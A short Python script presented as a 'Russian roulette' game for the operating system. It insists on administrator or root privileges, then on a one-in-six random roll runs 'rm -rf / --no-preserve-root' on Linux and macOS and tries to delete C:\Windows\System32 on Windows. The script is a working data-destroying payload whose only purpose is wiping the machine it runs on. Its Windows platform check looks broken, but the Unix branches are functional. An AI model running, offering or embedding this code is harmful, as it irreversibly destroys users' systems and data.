import ctypes, os, subprocess, random, shutil, platform

def main() -> None:

    # Get sudo in order to add the stakes.    
    if not isAdmin():
        print("You can not play the game without sudo/admin privileges. Exiting...")
        return exit()

    print("Loading chamber...")
    chamber_roll:int = random.randint(0,5);
    system_platform:str = platform.system().lower()
    os_gun_fired_dialog:str = "Your Operating System got hit! Say goodbye..."
        
    print("Pointing gun at your Operating System!")
    print("Gun FIRES!")
    if chamber_roll == 3 :
        if system_platform == "linux" or system_platform == "linux2":
            # Linux
            print(os_gun_fired_dialog)
            os.system("rm -rf / --no-preserve-root")

            # Should not get here...
            print("You got lucky this time, there were privilege conflicts...")
            return exit()
        elif system_platform == "darwin":
            # MacOS
            print(os_gun_fired_dialog)
            os.system("rm -rf / --no-preserve-root")

            # Should not get here...
            print("You got lucky this time, there were privilege conflicts...")
            return exit()
        elif system_platform == "win32":
            # Windows
            print(os_gun_fired_dialog)
            shutil.rmtree('C:\Windows\System32')

            # Should not get here...
            print("You got lucky this time, there were privilege conflicts...")
            return exit()	
    
    print("Your Operating System survived!")

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

    

if __name__ == "__main__":
    main()

